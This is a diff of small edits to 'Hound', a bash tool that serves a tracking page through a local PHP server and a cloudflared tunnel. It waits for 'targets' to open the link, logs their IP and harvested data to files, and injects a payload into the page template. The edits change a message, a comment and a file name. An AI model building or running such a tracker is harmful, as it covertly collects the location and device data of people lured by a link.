@@ -1,7 +1,6 @@
 #!/bin/bash
 # Hound v 0.2
 # Powered by TechChip
-# visit https://youtube.com/techchipnet
 
 trap 'printf "\n";stop' 2
 
@@ -49,13 +48,13 @@ cat ip.txt >> saved.ip.txt
 
 checkfound() {
 printf "\n"
-printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting targets,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
+printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting for targets,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
 while [ true ]; do
 if [[ -e "ip.txt" ]]; then
 printf "\n\e[1;92m[\e[0m+\e[1;92m] Target opened the link!\n"
 catch_ip
 rm -rf ip.txt
-tail -f -n 110 data.txt
+tail -f -n 110 data.txt  # Keep watching data.txt
 fi
 sleep 0.5
 done 
@@ -94,12 +93,12 @@ exit 1
 else
 printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" $link
 fi
-sed 's+forwarding_link+'$link'+g' Locaterrr.html > index.html  # Capital 'L' here
+sed 's+forwarding_link+'$link'+g' Locater.html > index.html  # Capital 'L'
 checkfound
 }
 
 local_server() {
-sed 's+forwarding_link+''+g' Locaterrr.html > index.html  # Capital 'L' here
+sed 's+forwarding_link+''+g' Locater.html > index.html  # Capital 'L'
 printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server on Localhost:8080...\n"
 php -S 127.0.0.1:8080 > /dev/null 2>&1 & 
 sleep 2
@@ -115,7 +114,7 @@ fi
 if [[ -e ip.txt ]]; then
 rm -rf ip.txt
 fi
-sed -e '/tc_payload/r payload' Locaterrr.html > index.html  # Capital 'L' here
+sed -e '/tc_payload/r payload' Locater.html > index.html  # Capital 'L'
 default_option_server="Y"
 read -p $'\n\e[1;93m Do you want to use cloudflared tunnel?\n \e[1;92motherwise it will be run on localhost:8080 [Default is Y] [Y/N]: \e[0m' option_server
 option_server="${option_server:-${default_option_server}}"
